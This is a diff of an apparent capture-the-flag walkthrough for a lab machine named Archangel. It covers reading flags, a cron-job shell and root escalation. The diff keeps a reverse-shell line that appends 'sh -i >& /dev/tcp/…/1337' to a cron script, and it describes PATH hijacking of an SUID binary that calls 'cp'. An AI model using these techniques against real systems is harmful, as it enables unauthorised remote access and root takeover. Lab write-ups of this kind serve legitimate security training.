@@ -72,28 +72,14 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/
 ```
 <figure><img src="archangel-12.png" alt=""><figcaption></figcaption></figure>
 
-## Privilege Escalation
+Reading `user.txt` flag.
+<figure><img src="archangel-13.png" alt=""><figcaption></figcaption></figure>
+
+## Shell as Archangel
 
 On `/etc/crontab` indicates this `/opt/helloworld.sh` runs with Archangel's privilege in 1 minute
 
-```
-$ cat /etc/crontab 
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-# m h dom mon dow user  command
-*/1 *   * * *   archangel /opt/helloworld.sh
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-```
+<figure><img src="archangel-14.png" alt=""><figcaption></figcaption></figure>
 
 We can take a look at this file:
 
@@ -106,79 +92,42 @@ www-data@ubuntu:/opt$ bash helloworld.sh
 helloworld.sh: line 2: /opt/backupfiles/helloworld.txt: Permission denied
 ```
 
-
-
 ```
 www-data@ubuntu:/opt$ echo "sh -i >& /dev/tcp/192.168.130.101/1337 0>&1" >> helloworld.sh
 ```
 
 
+<figure><img src="archangel-15.png" alt=""><figcaption></figcaption></figure>
 
+Reading `user2.txt` flag.
 
+<figure><img src="archangel-16.png" alt=""><figcaption></figcaption></figure>
 
-```
-archangel@ubuntu:~/secret$ ls -la
-total 32
-drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
-drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
--rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
--rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
+## Privilege Escalation
 
-archangel@ubuntu:~/secret$ ./backup
-cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
+Running Linpeas script, I found the file `backup`, using `strings` command we can see the binary is trying to execute a `cp` command.
 
-archangel@ubuntu:~/secret$ strings backup
-/lib64/ld-linux-x86-64.so.2
-setuid
-system
-__cxa_finalize
-setgid
-__libc_start_main
-libc.so.6
-GLIBC_2.2.5
-_ITM_deregisterTMCloneTable
-__gmon_start__
-_ITM_registerTMCloneTable
-u+UH
-[]A\A]A^A_
-cp /home/user/archangel/myfiles/* /opt/backupfiles
-:*3$"
-GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
-/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
-...
-```
+<figure><img src="archangel-17.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="archangel-18.png" alt=""><figcaption></figcaption></figure>
 
-The file backup is owned by the root and can be executed.
+We can take advantage of this by exporting a new path where our directory is searched in first and then get our own malicious binary executed with the SUID privileges (root privileges).
 
-We can see `cp /home/user/archangel/myfiles/* /opt/backupfiles`
-
-
+*Path before:*
 
 ```
 archangel@ubuntu:/tmp$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
+*Path after:*
+
 ```
 archangel@ubuntu:~/secret$ echo $PATH
 /home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
+<figure><img src="archangel-19.png" alt=""><figcaption></figcaption></figure>
 
-```
-The Privilege Escalation Vector (PATH Variable Manipulation)
+Since we are root, I was able to read `root.txt` flag.
 
-This technique exploits a misconfiguration where a program (often a script or an SUID binary) that runs with elevated privileges (like root) calls another program without an absolute path. 
-
-**How the attack works:**
-
-1. **Vulnerable Code:** A privileged script uses a relative command name, for example, `cp` instead of `/bin/cp`.
-   
-2. **Attacker Action:** The attacker has a low-privileged shell and checks if they have write permissions to any directories in the current user's `PATH` variable, or if they can modify the `PATH` variable itself.
-   
-3. **Malicious Binary:** The attacker creates a malicious executable file in a directory they control (e.g., `/tmp/`) and names it the same as the legitimate command (e.g., `cp`). The content of this malicious file is typically a command to spawn a root shell.
-   
-4. **PATH Manipulation:** The attacker then modifies their `PATH` environment variable to prioritize their malicious directory (e.g., `export PATH=/tmp:$PATH`).
-   
-5. **Execution:** When the vulnerable, privileged script is executed, the operating system's shell searches the `PATH` directories in order. It finds the attacker's malicious binary first and executes it with the script's elevated privileges (root), giving the attacker full system control.
-```
+<figure><img src="archangel-20.png" alt=""><figcaption></figcaption></figure>
